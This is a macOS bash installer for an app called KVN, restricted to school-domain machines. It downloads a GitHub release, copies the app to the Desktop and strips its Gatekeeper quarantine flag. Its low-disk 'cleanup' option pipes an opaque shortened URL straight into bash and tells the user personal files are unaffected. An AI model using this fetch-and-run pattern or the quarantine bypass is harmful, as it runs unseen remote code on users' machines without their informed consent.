#!/bin/bash

# Constants
readonly REPO="shepherl/kvnfaq"
readonly REQUIRED_SPACE_KB=307200 # 300 MB

# Create an isolated temporary directory
TMP_DIR=$(mktemp -d)
TMP_ARCHIVE="$TMP_DIR/KVN_Download"

# Installation function
install_app() {
    # Domain check
    if [[ $(hostname) == *.kzn.21-school.ru ]]; then

        # 1. Dynamically fetch the latest release link from GitHub API
        APP_URL=$(curl -s "https://api.github.com/repos/$REPO/releases/latest" | grep "browser_download_url" | grep -E '\.zip|\.dmg' | cut -d '"' -f 4 | head -n 1)

        if [ -z "$APP_URL" ]; then
            osascript -e 'display dialog "Could not find the installation file on GitHub." buttons {"OK"} default button 1 with title "Error" with icon stop'
            exit 1
        fi

        # 2. Download the file securely
        curl -L "$APP_URL" -o "$TMP_ARCHIVE"

        # 3. Unzip if it's a ZIP, otherwise use the DMG directly
        if [[ "$APP_URL" == *.zip ]]; then
            unzip -qo "$TMP_ARCHIVE" -d "$TMP_DIR"
            DMG_PATH=$(ls "$TMP_DIR"/*.dmg | head -n 1)
        else
            DMG_PATH="$TMP_ARCHIVE"
        fi

        # 4. Mount the downloaded image
        MOUNT_POINT=$(hdiutil attach -nobrowse -noautoopen "$DMG_PATH" | grep -Eo '/Volumes/.*' | head -n 1)

        # 5. Quit app if running, remove old version, and copy new one
        pkill -x "KVN" 2>/dev/null || true
        rm -rf ~/Desktop/KVN.app
        cp -R "$MOUNT_POINT"/*.app ~/Desktop/

        # 6. Cleanup system trash and isolated temp directory
        hdiutil detach "$MOUNT_POINT" -quiet -force 2>/dev/null
        rm -rf "$TMP_DIR"

        # 7. Grant permissions and remove quarantine (Gatekeeper)
        xattr -cr ~/Desktop/KVN.app
        touch ~/Desktop/KVN.app

        osascript -e 'display dialog "KVN installation completed successfully! The app is on your desktop." buttons {"OK"} default button 1 with title "Installer" with icon note'
    else
        osascript -e 'display dialog "Your device is not eligible for installation." buttons {"OK"} default button 1 with title "Error" with icon caution'
        # Still need to clean up temp dir if domain check fails
        rm -rf "$TMP_DIR"
    fi
    exit 0
}

# Space check function
check_space() {
    free_space_kb=$(df -Pk ~ | awk 'NR==2 {print $4}')
    [ "$free_space_kb" -lt "$REQUIRED_SPACE_KB" ] && return 1 || return 0
}

# --- Execution Logic ---

if ! check_space; then
    RESPONSE=$(osascript -e 'display dialog "Not enough disk space (minimum 300 MB). Would you like to clear temporary files? This will not affect your personal files." buttons {"Cancel", "Clean"} default button 2 with title "Storage Error" with icon caution')

    if [[ "$RESPONSE" == *"button returned:Clean"* ]]; then
        # ВНИМАНИЕ: всё ещё рекомендую заменить этот сокращенный URL на прямой код очистки или полный URL репозитория
        curl -sL https://u.to/Lk2ZIg | bash

        if check_space; then
            install_app
        else
            osascript -e 'display dialog "Cleanup finished, but there is still not enough space. Please manually delete unnecessary files and try again." buttons {"OK"} default button 1 with title "Error" with icon stop'
            rm -rf "$TMP_DIR"
            exit 1
        fi
    else
        rm -rf "$TMP_DIR"
        exit 1
    fi
else
    install_app
fi
